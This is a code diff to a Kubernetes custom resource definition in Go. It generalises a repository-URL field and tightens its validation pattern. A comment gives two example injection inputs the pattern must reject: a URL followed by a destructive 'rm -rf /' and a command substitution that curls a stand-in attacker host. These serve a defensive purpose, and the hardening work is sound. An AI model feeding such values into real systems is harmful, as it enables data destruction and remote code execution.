@@ -304,14 +304,24 @@ type CategoryOptions struct {
 	// +kubebuilder:validation:Pattern=`^([0-9]+(h|m|s|ms))+$`
 	MeasurementTimeout string `json:"measurementTimeout,omitempty"`
 
-	// megatronRepo is the Git repository URL for the Megatron-LM source used by
-	// training categories; defaults to https://github.com/NVIDIA/Megatron-LM.git.
-	// Point at an internal mirror for air-gapped or restricted-egress clusters.
-	// Must include a URL scheme (e.g., https:// or ssh://); scp-style
-	// git@host:path syntax is rejected.
+	// CRD admission is the sole validation gate for sourceRepo: the rendered
+	// value is spliced into a shell command in the catalog entry's clone step,
+	// so the Pattern below must keep rejecting inputs like
+	// "https://host/repo.git;rm -rf /" (shell metacharacters) and
+	// "$(curl attacker.example)" (command substitution).
+
+	// sourceRepo is the Git repository for the source checkout this category
+	// clones at pod start. Each catalog entry defines what its source is and
+	// its default upstream; point this at an internal mirror for air-gapped
+	// or restricted-egress clusters. Entries that clone no source ignore it.
+	// The URL must use a remote scheme (https://, http://, ssh://, or
+	// git://); scp-style git@host:path syntax and file:// are intentionally
+	// rejected: the contract is a remote git mirror, and local source belongs
+	// on the pre-seeded checkpoint PVC path instead.
 	// +optional
-	// +kubebuilder:validation:Pattern=`^[A-Za-z][A-Za-z0-9+.-]*://[A-Za-z0-9._~:/@%+-]+$`
-	MegatronRepo string `json:"megatronRepo,omitempty"`
+	// +kubebuilder:validation:MaxLength=2048
+	// +kubebuilder:validation:Pattern=`^(https?|ssh|git)://[A-Za-z0-9._~:/@%+-]+$`
+	SourceRepo string `json:"sourceRepo,omitempty"`
 }
 
 type CertificateCategory struct {
